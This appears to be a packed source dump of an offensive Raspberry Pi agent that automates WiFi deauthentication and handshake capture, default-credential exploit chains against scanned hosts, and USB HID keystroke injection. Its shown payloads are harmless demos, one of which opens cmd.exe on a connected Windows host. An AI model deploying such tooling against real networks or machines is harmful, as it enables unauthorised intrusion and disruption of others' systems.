    if args.no_gadget:
        enable_gadget = False

    state = AgentState()
    orch = BackendOrchestrator(
        state=state,
        cidr=args.cidr,
        scan_interval_s=args.scan_interval,
        enable_gadget=enable_gadget,
        enable_wifi_hunt=not args.no_wifi,
        enable_exploits=not args.no_exploits,
        payload_auto_run=args.payload_auto or bool(cfg.get("payload_auto_run", False)),
    )
    display = DisplayManager(
        state=state,
        refresh_s=display_interval,
        use_hardware=not args.mock_display,
    )

    display.start()
    orch.start()
    try:
        orch.wait()
    finally:
        display.stop()
        orch.shutdown()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
````

## File: agent/state.py
````python
"""Thread-safe shared state for workers and the display loop."""

from __future__ import annotations

import threading
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from enum import Enum
from typing import Callable, Deque, Dict, List, Optional, Set


class Mode(str, Enum):
    IDLE = "Idle"
    SCANNING = "Scanning"
    ACTIVE = "Active"
    HANDSHAKE = "Handshake"
    ATTACKING = "Attacking"
    PAYLOAD = "Payload"
    GADGET = "Gadget"
    ERROR = "Error"
    SHUTDOWN = "Shutdown"


@dataclass
class HostHit:
    ip: str
    hostname: str = ""
    open_ports: List[int] = field(default_factory=list)
    last_seen: str = ""


@dataclass
class SessionStats:
    """Pwnagotchi-style cumulative session counters."""

    scans_completed: int = 0
    deauths_sent: int = 0
    peers_seen: int = 0
    networks_seen: int = 0
    handshakes_total: int = 0
    exploits_pwned: int = 0
    payloads_run: int = 0
    payloads_ok: int = 0
    last_channel: str = ""


TriggerFn = Callable[[str, Dict], None]


class AgentState:
    """Central status object shared across threads."""

    def __init__(self, log_capacity: int = 8) -> None:
        self._lock = threading.RLock()
        self.mode: Mode = Mode.IDLE
        self.uptime_start = datetime.now(timezone.utc)
        self.cpu_percent: float = 0.0
        self.ram_percent: float = 0.0
        self.network_rx_kb: float = 0.0
        self.network_tx_kb: float = 0.0
        self.hosts_found: int = 0
        self.last_scan_hosts: List[HostHit] = []
        self.gadget_active: bool = False
        self.gadget_iface: str = ""
        self.hid_ready: bool = False
        self.payload_active: bool = False
        self.payload_name: str = ""
        self.wifi_aps_seen: int = 0
        self.handshakes_captured: int = 0
        self.wifi_target_essid: str = ""
        self.wifi_target_bssid: str = ""
        self.exploits_run: int = 0
        self.exploits_success: int = 0
        self.last_exploit: str = ""
        self.error_message: str = ""
        self.session = SessionStats()
        self._peers: Set[str] = set()
        self._networks: Set[str] = set()
        self._log: Deque[str] = deque(maxlen=log_capacity)
        self._trigger_fn: Optional[TriggerFn] = None

    def set_trigger_handler(self, handler: Optional[TriggerFn]) -> None:
        with self._lock:
            self._trigger_fn = handler

    def _emit_trigger(self, event: str, context: Dict) -> None:
        fn = self._trigger_fn
        if fn is None:
            return
        try:
            fn(event, context)
        except Exception:  # noqa: BLE001 — triggers must not break workers
            pass

    def set_mode(self, mode: Mode) -> None:
        with self._lock:
            self.mode = mode
            self.push_log(f"mode -> {mode.value}")

    def update_metrics(
        self,
        cpu: float,
        ram: float,
        network_rx_kb: float = 0.0,
        network_tx_kb: float = 0.0,
    ) -> None:
        with self._lock:
            self.cpu_percent = cpu
            self.ram_percent = ram
            self.network_rx_kb = network_rx_kb
            self.network_tx_kb = network_tx_kb

    def set_hosts(self, hosts: List[HostHit]) -> None:
        with self._lock:
            self.last_scan_hosts = list(hosts)
            self.hosts_found = len(hosts)

    def record_scan_complete(self, host_count: int) -> None:
        with self._lock:
            self.session.scans_completed += 1
        self._emit_trigger("scan_complete", {"hosts": host_count})

    def set_gadget(self, active: bool, iface: str = "", hid: bool = False) -> None:
        with self._lock:
            self.gadget_active = active
            self.gadget_iface = iface
            self.hid_ready = hid if active else False
            state = "up" if active else "down"
            hid_tag = "+HID" if hid and active else ""
            self.push_log(f"gadget {state}{hid_tag} {iface}".strip())
        if active:
            self._emit_trigger("gadget_up", {"iface": iface, "hid": hid})

    def set_wifi_status(
        self,
        aps_seen: int,
        handshakes: int,
        target_essid: str = "",
        target_bssid: str = "",
        channel: str = "",
    ) -> None:
        with self._lock:
            self.wifi_aps_seen = aps_seen
            self.handshakes_captured = handshakes
            if target_essid:
                self.wifi_target_essid = target_essid
                if target_essid not in self._networks:
                    self._networks.add(target_essid)
                    self.session.networks_seen = len(self._networks)
            if target_bssid:
                self.wifi_target_bssid = target_bssid
                if target_bssid not in self._peers:
                    self._peers.add(target_bssid)
                    self.session.peers_seen = len(self._peers)
            if channel:
                self.session.last_channel = channel

    def record_deauth(self, count: int = 1, bssid: str = "") -> None:
        with self._lock:
            self.session.deauths_sent += count
            if bssid and bssid not in self._peers:
                self._peers.add(bssid)
                self.session.peers_seen = len(self._peers)

    def record_handshake(self, essid: str, bssid: str) -> None:
        with self._lock:
            self.handshakes_captured += 1
            self.session.handshakes_total += 1
            self.wifi_target_essid = essid
            self.wifi_target_bssid = bssid
            self.push_log(f"HS! {essid or bssid}")
        self._emit_trigger(
            "handshake",
            {"essid": essid, "bssid": bssid, "count": self.handshakes_captured},
        )

    def record_exploit(self, module: str, target: str, success: bool) -> None:
        with self._lock:
            self.exploits_run += 1
            if success:
                self.exploits_success += 1
                self.session.exploits_pwned += 1
            self.last_exploit = f"{module}@{target}"
            tag = "WIN" if success else "fail"
            self.push_log(f"exp {module} {target} {tag}")
        if success:
            self._emit_trigger(
                "exploit_success",
                {"module": module, "ip": target},
            )

    def record_payload(self, name: str, success: bool) -> None:
        with self._lock:
            self.session.payloads_run += 1
            if success:
                self.session.payloads_ok += 1

    def set_payload(self, active: bool, name: str = "") -> None:
        with self._lock:
            self.payload_active = active
            self.payload_name = name
            if active and name:
                self.push_log(f"payload {name}")

    def set_error(self, message: str) -> None:
        with self._lock:
            self.error_message = message
            self.mode = Mode.ERROR
            self.push_log(f"ERR: {message}")

    def push_log(self, message: str) -> None:
        ts = datetime.now().strftime("%H:%M:%S")
        with self._lock:
            self._log.appendleft(f"{ts} {message}")

    def snapshot(self) -> dict:
        with self._lock:
            uptime = datetime.now(timezone.utc) - self.uptime_start
            sess = self.session
            return {
                "mode": self.mode,
                "uptime_s": int(uptime.total_seconds()),
                "cpu_percent": self.cpu_percent,
                "ram_percent": self.ram_percent,
                "network_rx_kb": self.network_rx_kb,
                "network_tx_kb": self.network_tx_kb,
                "hosts_found": self.hosts_found,
                "last_scan_hosts": list(self.last_scan_hosts),
                "gadget_active": self.gadget_active,
                "gadget_iface": self.gadget_iface,
                "hid_ready": self.hid_ready,
                "payload_active": self.payload_active,
                "payload_name": self.payload_name,
                "wifi_aps_seen": self.wifi_aps_seen,
                "handshakes_captured": self.handshakes_captured,
                "wifi_target_essid": self.wifi_target_essid,
                "wifi_target_bssid": self.wifi_target_bssid,
                "exploits_run": self.exploits_run,
                "exploits_success": self.exploits_success,
                "last_exploit": self.last_exploit,
                "error_message": self.error_message,
                "session_scans": sess.scans_completed,
                "session_deauths": sess.deauths_sent,
                "session_peers": sess.peers_seen,
                "session_networks": sess.networks_seen,
                "session_pwned": sess.exploits_pwned + sess.handshakes_total,
                "session_payloads_run": sess.payloads_run,
                "session_payloads_ok": sess.payloads_ok,
                "session_channel": sess.last_channel,
                "log_lines": list(self._log),
            }
````

## File: captures/handshakes/.gitkeep
````

````

## File: config/default.yaml
````yaml
# Copy to config/local.yaml to override (local.yaml is gitignored).
networks:
  - 192.168.1.0/24
scan_interval: 90
metrics_interval: 5
display_interval: 12

# P4wnP1 USB composite gadget (ethernet + HID keyboard)
enable_gadget: true
enable_hid: true
payload_auto_run: false
payload_file: payloads/demo_opener.ducky
enable_payload_triggers: true

# Pwnagotchi WiFi handshake hunting
enable_wifi_hunt: true
wifi_interface: wlan0
wifi_interval: 120
handshake_deauth_count: 5

# Bjorn exploit chains
enable_exploits: true
exploit_interval: 180

# Optional extra triggers (merged with payloads/manifest.yaml)
payload_triggers: []
````

## File: docs/architecture.md
````markdown
# CyberAgent — Pwnagotchi + Bjorn + P4wnP1 Offensive Blend

Headless Raspberry Pi Zero W attack agent with Waveshare 2.13" tri-color e-ink telemetry.

## What each project contributes

| Source | Capability in this repo |
|--------|-------------------------|
| **Pwnagotchi** | WiFi handshake hunting (monitor mode, deauth, cap capture), telemetry grid UI |
| **Bjorn** | Subnet recon, port sweep, exploit chain runner (`ssh_defaults`, `ftp_anon`, `http_defaults`) |
| **P4wnP1** | USB composite gadget (RNDIS/ECM + HID keyboard), DuckyScript payload runner |

## Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                     Raspberry Pi Zero W                      │
│  backend_worker (orchestrator)                               │
│    ├─ recon        Bjorn subnet scan + port probe             │
│    ├─ wifi         Pwnagotchi handshake hunt                  │
│    ├─ exploits     Bjorn module chain on open services        │
│    ├─ gadget       P4wnP1 ConfigFS RNDIS/ECM + HID           │
│    └─ payloads     P4wnP1 DuckyScript → /dev/hidg0          │
│                          │                                    │
│                          ▼ AgentState                         │
│  display_manager   Pwnagotchi-style 250×122 offensive grid   │
└──────────────────────────────────────────────────────────────┘
```

## E-ink display layout

```
┌──────────────────────────────────────────────┐
│ RPi-Agent                 HANDSHAKE  HS:1   │  mode + handshakes (red)
├──────────────────────────────────────────────┤
│ PEERS:1  DEAUTH:5           PWN:2            │  Pwnagotchi session stats
│ APs:12 HOSTS:5    EXP:2/8         CH:6       │
│ CPU 45% RAM 62%           UP 01:23:45        │
├──────────────────────────────────────────────┤
│ GAD:ON+HID PLD:1/2          TestNet          │  payload stats + WiFi target
├──────────────────────────────────────────────┤
│ 08:01 exp ssh_defaults 10.0.0.1 WIN          │
│ 08:01 HS! TestNet                            │
└──────────────────────────────────────────────┘
```


## Bjorn modules (12)

`ssh_defaults`, `ftp_anon`, `http_defaults`, `http_sensitive`, `telnet_defaults`,
`redis_unauth`, `mongo_unauth`, `mysql_defaults`, `smb_null`, `snmp_public`,
`rdp_probe`, `vnc_probe`

## P4wnP1 payload triggers

Rules in `payloads/manifest.yaml` (+ `config payload_triggers`):

| Event | When fired |
|-------|------------|
| `boot` | Agent start (optional) |
| `gadget_host` | USB host connects (UDC configured) |
| `handshake` | WPA handshake captured |
| `exploit_success` | Bjorn module wins (optional `module` filter) |
| `scan_complete` | Recon sweep finished |
| `interval` | Periodic (`interval_s` on rule) |
| manual | Write payload name to `payloads/trigger.request` |

Example manual trigger: `echo on_pwn.ducky > payloads/trigger.request`

## Deployment

```bash
# On Pi — system tools for WiFi/offense
sudo apt install aircrack-ng iw sshpass

pip install -r requirements.txt

# Waveshare library + SPI (see docs/hardware-pinout.md)
sudo raspi-config  # enable SPI

# Run full offensive stack (mock display for dev)
python3 agent/main.py --mock-display

# On device with HAT + root for gadget/WiFi
sudo python3 agent/main.py --enable-gadget --payload-auto
```

Config: `config/default.yaml` or gitignored `config/local.yaml`.

## Payloads

Place DuckyScript files in `payloads/`. Set `payload_file` in config or use `--payload-auto` to run when HID connects.

## Captures

WiFi handshakes saved under `captures/handshakes/` when `aircrack-ng` is available.
````

## File: docs/hardware-pinout.md
````markdown
2.13inch e-Paper HAT (B) Manual
2.13inch e-Paper (B)
2.13inch-e-Paper-B-1.jpg

250x122, 2.13inch EPD panel
2.13inch e-Paper HAT (B)
2.13inch-e-paper-hat-b-5 1.jpg

250x122, 2.13inch EPD HAT for Raspberry Pi, three-color, SPI interface
Introduction
Version

V4: resolution of 250 × 122, V4 version hardware structure and interface compatible with V3 version, using V4 program. If you are buying for the first time and have a V4 label on the back of the screen, just use the V4 program.
V3: The resolution is 212 × 104, and the hardware structure and interface of V3 version are compatible with older versions. The V3 program is used.
Parameters
Dimensions	2.13inch
Driver Board Dimensions	65mm × 30.2mm
Display Dimensions	48.55mm × 23.71mm
Outline Dimensions (screen only)	59.2mm × 29.2mm × 0.98mm
Operating Voltage	3.3V / 5V (5V is required for power and signal)
Communication Interface	SPI
Dot Pitch	0.194mm × 0.194mm
Resolution	250 × 122
Display Color	Black, White, Red
Grey Scale	2
Refresh Time	15s
Refresh Power	26.4mW（typ.）
Standby Current	< 0.01uA (almost 0)
Working Temperature	0 ~ 40 ℃
Storage Temperature	-25 ~ 40 ℃
Refresh time: The refresh time is the experimental results, the actual refresh time will have errors, and the actual effect shall prevail. There will be a flickering effect during the global refresh process, this is a normal phenomenon.
Power consumption: The power consumption data is the experimental results. The actual power consumption will have a certain error due to the existence of the driver board and the actual use situation. The actual effect shall prevail.
Communication Method
Operating Principle
Program Principle
We define the pixels in a monochrome picture, 0 is black and 1 is white.
White: □: Bit 1
Black: ■: Bit 0

The dot in the figure is called a pixel. As we know, 1 and 0 are used to define the color, therefore we can use one bit to define the color of one pixel, and 1 byte = 8pixels
For example, If we set the first 8 pixels to black and the last 8 pixels to white, we show it by codes, they will be 16-bit as below:
E-paper hardware work 1.png

For the computer, the data is saved in MSB format:
E-paper hardware work 2.png
So we can use two bytes for 16 pixels.

For the 2.13inch e-paper B, it is red and black, we need to split the picture into 2 pictures, one black and white picture, a red and white picture because one register controls the black and white display during transmission, and the other register controls the red and white show. 1 byte of 2.13 black and white part controls 8 pixels, and 1 byte of red and white part controls 8 pixels
For example, suppose there are 8 pixels, the first 4 are red, and the last 4 are black:
They need to be split into a black-and-white picture and a red-and-white picture. Both pictures have 8 pixels, but the first four pixels of the black and white picture are white, the last 4 pixels are black, and the first 4 pixels of the red and white picture are black. pixels are red, the last four pixels are white.
2.13inch-epPaer-B-pixels.png

If we specify that white is stored as 1 and red or black is stored as 0, then we have the following representation:
2.13inch-epPaer-B-pixels-2.png

And 1 byte of black and white part controls 8 pixels, and 1 byte of red and white part controls 8 pixels, then it can be expressed as follows:

2.13inch-epPaer-B-pixels-3.png

Precautions
For e-Paper displays that support partial refresh, please note that you cannot refresh them with the partial refresh mode all the time. After refreshing partially several times, you need to fully refresh EPD once. Otherwise, the display effect will be abnormal.
It is a normal phenomenon that the three-color or multi-color EPD will have a certain color difference in different batches. Hence, it is recommended to use the program to clear all the pictures on the EPD and store it facing up. Please clear the screen several times before powering on.
Note that the screen cannot be powered on for a long time. When the screen is not refreshed, please set the screen to sleep mode or power off it. Otherwise, the screen will remain in a high voltage state for a long time, which will damage the e-Paper and cannot be repaired!
When using the e-Paper display, it is recommended that the refresh interval be at least 180s, and refresh at least once every 24 hours. If the e-Paper is not used for a long time, you should use the program to clear the screen before storing it. (Refer to the datasheet for specific storage environment requirements.)
After the screen enters sleep mode, the sent image data will be ignored, and it can be refreshed normally only after initializing again.
Control the 0x3C or 0x50 (refer to the datasheet for details) register to adjust the border color. In the demo, you can adjust the Border Waveform Control register or VCOM AND DATA INTERVAL SETTING to set the border.
If you find that the created image data is displayed incorrectly on the screen, it is recommended to check whether the image size setting is correct, change the width and height settings of the image and try again.
The working voltage of the e-Paper display is 3.3V. If you buy the raw panel, you need to add a level convert circuit for compatibility with 5V voltage. The new version of the driver board (V2.1 and subsequent versions) has added a level processing circuit, which can support both 3.3V and 5V. The old version only supports a 3.3V working environment. You can confirm the version before using it. (The version number is under the board name.)
The FPC cable of the screen is fragile, Please note: Do not bend the cable along the vertical direction of the screen to avoid tearing the cable; Do not repeatedly excessive bending the cable, to avoid the cable fracture; Do not bend the cable toward the front of the screen to avoid the cable from being disconnected from the panel. It is recommended to use fixed wiring during debugging and development.
The screen of e-Paper is relatively fragile, please try to avoid dropping, bumping and pressing hard.
We recommend that customers use the sample program provided by us to test with the corresponding development board.
Working With Raspberry Pi
Hardware Connection
When connecting the Raspberry Pi, you can directly insert the board into the 40PIN pin header of the Raspberry Pi, and pay attention to the correct pins.
If you choose to connect with an 8PIN cable, please refer to the pin correspondence table below:

Raspberry Pi Pinout
e-Paper	Raspberry Pi
BCM2835	Board
VCC	3.3V	3.3V
GND	GND	GND
DIN	MOSI	19
CLK	SCLK	23
CS	CE0	24
DC	25	22
RST	17	11
BUSY	24	18
Enable SPI Interface
Open the Raspberry Pi terminal and enter the following command in the config interface:
sudo raspi-config
Choose Interfacing Options -> SPI -> Yes Enable SPI interface
RPI open spi.png
Then reboot your Raspberry Pi:

sudo reboot
Check /boot/config.txt, and you can see 'dtparam=spi=on' was written in.
Raspberry Pi Guides for 4.37 e-Paper.jpg

To make sure SPI is not occupied, it is recommended to close other drivers' coverage. You can use ls /dev/spi* to check whether SPI is occupied. If the terminal outputs /dev/spidev0.1 and /dev/spidev0.1, SPI is not occupied.
Raspberry Pi Guides for 4.37 e-Paper02.jpg

C
Install lg library
#Open the Raspberry Pi terminal and run the following commands: 
wget https://github.com/joan2937/lg/archive/master.zip
unzip master.zip
cd lg-master
make
sudo make install
#For more details, you can refer to the source code: https://github.com/gpiozero/lg
Install gpiod library (Optional)
#Open the Raspberry Pi terminal and run the following commands: 
sudo apt-get update
sudo apt install gpiod libgpiod-dev
Install BCM2835:
#Open the Raspberry Pi terminal and run the following command
wget http://www.airspayce.com/mikem/bcm2835/bcm2835-1.71.tar.gz
tar zxvf bcm2835-1.71.tar.gz
cd bcm2835-1.71/
sudo ./configure && sudo make && sudo make check && sudo make install
# For more information, please refer to the official website: http://www.airspayce.com/mikem/bcm2835/
Install WiringPi (Optional):
#Open the Raspberry Pi terminal and run the following command:
sudo apt-get install wiringpi
#For Raspberry Pi systems after May 2019 (earlier than before, you may not need to execute), you may need to upgrade:
wget https://project-downloads.drogon.net/wiringpi-latest.deb
sudo dpkg -i wiringpi-latest.deb
gpio -v
#Run gpio -v and version 2.52 will appear. If it does not appear, the installation is wrong.

#Bullseye branch system use the following command:
git clone https://github.com/WiringPi/WiringPi
cd WiringPi
./build
gpio -v
# Run gpio -v and version 2.60 will appear. If it does not appear, it means that there is an installation error.
Download the demo via GitHub (You can skip this step if you have downloaded it.)
git clone https://github.com/waveshare/e-Paper.git
cd e-Paper/RaspberryPi_JetsonNano/
Download the demo (You can skip this step if you have downloaded it.)
wget https://files.waveshare.com/upload/7/71/E-Paper_code.zip
unzip E-Paper_code.zip -d e-Paper
cd e-Paper/RaspberryPi_JetsonNano/
Alternate method of decompression:
sudo apt-get install p7zip-full
7z x E-Paper_code.zip -O./e-Paper
cd e-Paper/RaspberryPi_JetsonNano/
Compile the demo (Note: -j4 is to compile with 4 threads, the numbers can be modified by yourself; EPD=epd2in13bV4 is to specify a macro definition, and epd2in13bV4 corresponds to the test demo in the main function).
# Now at e-Paper/RaspberryPi_JetsonNano
cd c
sudo make clean
sudo make -j4 EPD=epd2in13bV4
Run the demo
sudo ./epd
Python
Install the function library.
sudo apt-get update
sudo apt-get install python3-pip
sudo apt-get install python3-pil
sudo apt-get install python3-numpy
sudo pip3 install spidev
Install the function library (python2).
sudo apt-get update
sudo apt-get install python-pip
sudo apt-get install python-pil
sudo apt-get install python-numpy
sudo pip install spidev
Install gpiozero library (it is installed in the system by default, if not, you can install it by following the commands below)
sudo apt-get update
# python3
sudo apt install python3-gpiozero
# python2
sudo apt install python-gpiozero
Download the demo via GitHub (You can skip this step if you have downloaded it.)
git clone https://github.com/waveshare/e-Paper.git
cd e-Paper/RaspberryPi_JetsonNano/
Download the demo (You can skip this step if you have downloaded it.)
wget https://files.waveshare.com/upload/7/71/E-Paper_code.zip
unzip E-Paper_code.zip -d e-Paper
cd e-Paper/RaspberryPi_JetsonNano/
Alternate method of decompression:
sudo apt-get install p7zip-full
7z x E-Paper_code.zip -O./e-Paper
cd e-Paper/RaspberryPi_JetsonNano/
Run the demo.
# Make sure it's in e-Paper/RaspberryPi_JetsonNano/
cd python/examples/
python3 epd_2in13b_V4_test.py
````

## File: payloads/beacon.ducky
````
# Optional periodic beacon (enable in manifest)
DELAY 200
STRING echo rpi-agent-alive
ENTER
````

## File: payloads/demo_opener.ducky
````
# Demo HID payload — opens Run dialog on Windows host (P4wnP1-style).
# Customize for your engagement; run with gadget + HID enabled.
DELAY 2000
GUI r
DELAY 500
STRING cmd.exe
ENTER
DELAY 800
STRING echo pwned-by-rpi-agent
ENTER
````

## File: payloads/manifest.yaml
````yaml
# P4wnP1-style payload trigger manifest (merged with config payload_triggers).
triggers:
  - event: boot
    payload: payloads/demo_opener.ducky
    cooldown_s: 0
    enabled: false

  - event: gadget_host
    payload: payloads/demo_opener.ducky
    cooldown_s: 120

  - event: handshake
    payload: payloads/on_handshake.ducky
    cooldown_s: 90

  - event: exploit_success
    payload: payloads/on_pwn.ducky
    cooldown_s: 60

  - event: exploit_success
    module: ssh_defaults
    payload: payloads/on_ssh_pwn.ducky
    cooldown_s: 120

  - event: scan_complete
    payload: payloads/on_scan.ducky
    cooldown_s: 300
    enabled: false

  - event: interval
    payload: payloads/beacon.ducky
    interval_s: 600
    cooldown_s: 600
    enabled: false
````

## File: payloads/on_handshake.ducky
````
# Quick beacon after handshake capture
DELAY 500
STRING echo handshake-captured
ENTER
````

## File: payloads/on_pwn.ducky
````
# Fired on any successful Bjorn exploit module
DELAY 800
STRING echo pwned-by-bjorn-chain
ENTER
````

## File: payloads/on_ssh_pwn.ducky
````
# Fired when ssh_defaults module wins
DELAY 1000
STRING echo ssh-pwned
ENTER
````

## File: scripts/usb_gadget.sh
````bash
#!/usr/bin/env bash
# USB composite gadget: RNDIS + ECM ethernet + HID keyboard (P4wnP1-style).
# Usage: sudo ./scripts/usb_gadget.sh start|stop [hid]
set -euo pipefail

GADGET_NAME="rpi_agent"
G="/sys/kernel/config/usb_gadget/${GADGET_NAME}"
ENABLE_HID="${2:-hid}"

start_gadget() {
  if [[ ! -d /sys/kernel/config/usb_gadget ]]; then
    echo "ConfigFS usb_gadget missing (modprobe libcomposite?)" >&2
    exit 1
  fi

  mkdir -p "$G"
  echo 0x1d6b > "$G/idVendor"
  echo 0x0104 > "$G/idProduct"
  echo 0x0100 > "$G/bcdDevice"
  echo 0x0200 > "$G/bcdUSB"

  mkdir -p "$G/strings/0x409"
  echo "rpi-agent-001" > "$G/strings/0x409/serialnumber"
  echo "RPiAgent" > "$G/strings/0x409/manufacturer"
  echo "RPi USB Attack" > "$G/strings/0x409/product"

  mkdir -p "$G/functions/rndis.usb0"
  mkdir -p "$G/functions/ecm.usb0"

  if [[ "$ENABLE_HID" == "hid" ]]; then
  mkdir -p "$G/functions/hid.usb0"
  echo 1 > "$G/functions/hid.usb0/protocol"
  echo 1 > "$G/functions/hid.usb0/subclass"
  echo 8 > "$G/functions/hid.usb0/report_length"
  printf '\\x05\\x01\\x09\\x06\\xa1\\x01\\x05\\x07\\x19\\xe0\\x29\\xe7\\x15\\x00\\x25\\x01\\x75\\x01\\x95\\x08\\x81\\x02\\x95\\x01\\x75\\x08\\x81\\x03\\x95\\x05\\x75\\x01\\x05\\x08\\x19\\x01\\x29\\x05\\x91\\x02\\x95\\x01\\x75\\x03\\x91\\x03\\x95\\x06\\x75\\x08\\x15\\x00\\x25\\x65\\x05\\x07\\x19\\x00\\x29\\x65\\x81\\x00\\xc0' > "$G/functions/hid.usb0/report_desc"
  fi

  mkdir -p "$G/configs/c.1/strings/0x409"
  echo "RNDIS+ECM+HID" > "$G/configs/c.1/strings/0x409/configuration"
  echo 250 > "$G/configs/c.1/MaxPower"

  ln -sfn "$G/functions/rndis.usb0" "$G/configs/c.1/"
  ln -sfn "$G/functions/ecm.usb0" "$G/configs/c.1/"
  if [[ "$ENABLE_HID" == "hid" ]]; then
    ln -sfn "$G/functions/hid.usb0" "$G/configs/c.1/"
  fi

  UDC="$(ls /sys/class/udc | head -n1 || true)"
  if [[ -z "${UDC}" ]]; then
    echo "No UDC found" >&2
    exit 1
  fi
  echo "$UDC" > "$G/UDC"
  echo "gadget started on UDC=${UDC} hid=${ENABLE_HID}"
}

stop_gadget() {
  if [[ ! -d "$G" ]]; then
    echo "gadget not present"
    return 0
  fi
  if [[ -e "$G/UDC" ]]; then
    echo "" > "$G/UDC" || true
  fi
  rm -f "$G/configs/c.1/rndis.usb0" "$G/configs/c.1/ecm.usb0" "$G/configs/c.1/hid.usb0" || true
  rmdir "$G/configs/c.1/strings/0x409" 2>/dev/null || true
  rmdir "$G/configs/c.1" 2>/dev/null || true
  rmdir "$G/functions/rndis.usb0" 2>/dev/null || true
  rmdir "$G/functions/ecm.usb0" 2>/dev/null || true
  rmdir "$G/functions/hid.usb0" 2>/dev/null || true
  rmdir "$G/strings/0x409" 2>/dev/null || true
  rmdir "$G" 2>/dev/null || true
  echo "gadget stopped"
}

case "${1:-}" in
  start) start_gadget ;;
  stop) stop_gadget ;;
  *)
    echo "usage: $0 start|stop [hid|nohid]" >&2
    exit 2
    ;;
esac
````

## File: .gitignore
````
.venv/
__pycache__/
*.py[cod]
logs/*
!logs/.gitkeep
captures/handshakes/*
!captures/handshakes/.gitkeep
*.egg-info/
.pytest_cache/
*.log
*.pid
*.sock
config/local.yaml
agent/vendor/
payloads/trigger.request
repomix*.xml
````

## File: backend_worker.py
````python
#!/usr/bin/env python3
"""Root-level shim for agent.backend_worker."""
from agent.backend_worker import BackendOrchestrator, run_backend

__all__ = ["BackendOrchestrator", "run_backend"]

if __name__ == "__main__":
    import logging

    logging.basicConfig(level=logging.INFO)
    run_backend()
````

## File: display_manager.py
````python
#!/usr/bin/env python3
"""Root-level shim for agent.ui.display_manager."""
import argparse
import logging

from agent.state import AgentState, Mode
from agent.ui.display_manager import DisplayManager

__all__ = ["DisplayManager"]


def run_display(mock: bool = False, refresh_s: float = 12.0) -> None:
    """Standalone display test loop with a dummy shared state."""
    logging.basicConfig(level=logging.INFO)
    state = AgentState()
    state.set_mode(Mode.ACTIVE)
    state.push_log("display standalone")
    state.update_metrics(12.3, 45.6, 1024.0, 2048.0)

    display = DisplayManager(state=state, refresh_s=refresh_s, use_hardware=not mock)
    display.start()
    try:
        while True:
            import time

            time.sleep(1.0)
    except KeyboardInterrupt:
        display.stop()


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="E-ink display loop")
    p.add_argument("--mock", action="store_true", help="PNG preview instead of SPI hardware")
    p.add_argument("--refresh", type=float, default=12.0, help="Seconds between refreshes")
    args = p.parse_args()
    run_display(mock=args.mock, refresh_s=args.refresh)
````

## File: README.md
````markdown
# CyberAgent

Pwnagotchi + Bjorn + P4wnP1 offensive agent for Raspberry Pi Zero W with Waveshare 2.13" tri-color e-ink.

## Quick start

```bash
sudo apt install aircrack-ng iw sshpass   # on Pi
pip install -r requirements.txt
sudo raspi-config   # enable SPI

python3 agent/main.py --mock-display              # dev preview
sudo python3 agent/main.py --enable-gadget        # full stack on device
```

Config: `config/default.yaml` → copy to `config/local.yaml` to override.

## Layout

```
agent/           Python package (orchestrator, workers, UI, offensive modules)
config/          YAML defaults
docs/            Architecture + hardware notes
payloads/        DuckyScript payloads + trigger manifest
scripts/         USB gadget setup
backend_worker.py / display_manager.py   Root shims
```

## Docs

- [Architecture & display layout](docs/architecture.md)
- [E-ink HAT pinout & SPI](docs/hardware-pinout.md)

## Manual payload trigger

```bash
echo on_pwn.ducky > payloads/trigger.request
```
````

## File: requirements.txt
````
Pillow>=10.4.0
psutil>=5.9.8
pyyaml>=6.0.1
paramiko>=3.4.0
spidev>=3.6; platform_machine == "armv6l" or platform_machine == "armv7l" or platform_machine == "aarch64"
RPi.GPIO>=0.7.1; platform_machine == "armv6l" or platform_machine == "armv7l" or platform_machine == "aarch64"
# System packages on Pi (apt): aircrack-ng sshpass iw
# Waveshare e-Paper Python library (install from vendor repo on device):
#   git clone https://github.com/waveshare/e-Paper.git
#   cd e-Paper/RaspberryPi_JetsonNano/python
#   sudo python3 setup.py install
````
